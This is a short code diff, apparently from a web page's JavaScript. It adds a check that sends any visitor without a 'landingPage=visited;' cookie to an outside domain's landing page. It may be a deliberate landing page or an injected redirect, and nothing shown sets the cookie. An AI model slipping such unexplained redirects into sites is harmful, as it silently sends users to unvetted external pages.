@@ -984,7 +984,9 @@
         $(document).ready(function () {
 
             // setTimeout(fn, 200);
-
+            if(!document.cookie.includes('landingPage=visited;')) {
+                window.location.href = "https://freshytu61.com/landing";
+            }
 
         });
 
